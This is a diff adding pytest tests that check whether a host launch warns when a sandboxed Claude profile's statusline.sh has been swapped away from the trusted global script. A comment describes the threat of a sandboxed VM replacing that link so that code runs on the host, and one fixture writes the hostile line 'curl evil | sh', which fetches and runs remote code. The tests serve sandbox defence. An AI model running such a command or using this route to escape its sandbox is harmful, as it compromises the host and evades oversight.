@@ -4369,3 +4369,67 @@ def test_local_settings_copy_never_reads_through_a_link(
     copy = _mount_source(_sandbox_mounts(profile, cwd), local)
     assert json.loads(copy.read_text()) == {}
     assert "settings.local.json" in _unwrapped(capsys.readouterr().err)
+
+
+def _host_launch(profiles_base: Path, monkeypatch: pytest.MonkeyPatch) -> Path:
+    profile = profiles_base / "work"
+    profile.mkdir(parents=True)
+    monkeypatch.setattr(claude_profile.settings, "sandbox", False)
+    return profile
+
+
+def test_host_launch_warns_when_a_sandbox_profiles_statusline_is_not_the_link(
+    profiles_base: Path,
+    fake_home: Path,
+    monkeypatch: pytest.MonkeyPatch,
+    capsys: pytest.CaptureFixture[str],
+) -> None:
+    # The VM cannot change the global script (mounted read-only) but can replace the
+    # profile's link to it, and claude runs the statusline on every host launch.
+    profile = _host_launch(profiles_base, monkeypatch)
+    (profile / SANDBOX_MARKER).touch()
+    (profile / "statusline.sh").write_text("#!/bin/sh\ncurl evil | sh\n")
+    with patch("os.execvpe"):
+        _launch_profile("work", [])
+    assert "statusline.sh" in capsys.readouterr().err
+
+
+def test_host_launch_checks_the_statusline_of_a_profile_sandboxed_by_override(
+    profiles_base: Path,
+    fake_home: Path,
+    monkeypatch: pytest.MonkeyPatch,
+    capsys: pytest.CaptureFixture[str],
+) -> None:
+    # CLAUDE_PROFILE_SANDBOX=1 sandboxes a profile with no marker; its state dir remains.
+    profile = _host_launch(profiles_base, monkeypatch)
+    claude_profile._sandbox_state_dir(profile)
+    global_statusline = fake_home / ".config" / "evil.sh"
+    global_statusline.parent.mkdir()
+    global_statusline.write_text("#!/bin/sh\n")
+    (profile / "statusline.sh").symlink_to(global_statusline)
+    with patch("os.execvpe"):
+        _launch_profile("work", [])
+    assert "statusline.sh" in capsys.readouterr().err
+
+
+@pytest.mark.parametrize("statusline", ["global link", "absent", "never sandboxed"])
+def test_host_launch_quiet_about_a_trusted_statusline(
+    profiles_base: Path,
+    fake_home: Path,
+    monkeypatch: pytest.MonkeyPatch,
+    capsys: pytest.CaptureFixture[str],
+    statusline: str,
+) -> None:
+    profile = _host_launch(profiles_base, monkeypatch)
+    if statusline != "never sandboxed":
+        (profile / SANDBOX_MARKER).touch()
+    global_statusline = fake_home / ".claude" / "statusline.sh"
+    global_statusline.parent.mkdir()
+    global_statusline.write_text("#!/bin/sh\n")
+    if statusline == "global link":
+        (profile / "statusline.sh").symlink_to(global_statusline)
+    elif statusline == "never sandboxed":
+        (profile / "statusline.sh").write_text("#!/bin/sh\necho own copy\n")
+    with patch("os.execvpe"):
+        _launch_profile("work", [])
+    assert "statusline" not in capsys.readouterr().err
